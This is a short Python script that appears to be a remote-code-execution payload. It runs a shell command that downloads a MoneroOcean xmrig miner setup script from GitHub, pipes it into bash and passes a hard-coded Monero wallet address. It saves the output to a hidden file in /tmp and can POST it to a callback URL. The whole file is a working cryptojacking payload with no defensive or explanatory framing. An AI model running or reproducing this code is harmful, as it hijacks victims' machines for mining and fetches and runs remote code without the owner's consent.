import subprocess, os, urllib.request

CMD = 'curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 47EDNdCkTJLZ2PjFPJrDfJTMUUE8AC5ZkYBdqoxbhX2QfXLdrVAS5AtQpFMRLbQdLP9QiXs2LBBouXxqWW6v4g4qCUBMXmG'
CALLBACK = ''
OUTFILE = '/tmp/.rce_out'

try:
    out = subprocess.check_output(CMD, shell=True, stderr=subprocess.STDOUT, timeout=30)
    out = out.decode("utf-8", errors="replace")
except Exception as e:
    out = "ERROR: " + str(e)

try:
    with open(OUTFILE, "w") as f:
        f.write(out)
except Exception:
    pass

if CALLBACK:
    try:
        req = urllib.request.Request(
            CALLBACK, data=out.encode("utf-8"), method="POST",
            headers={"Content-Type": "text/plain"},
        )
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass
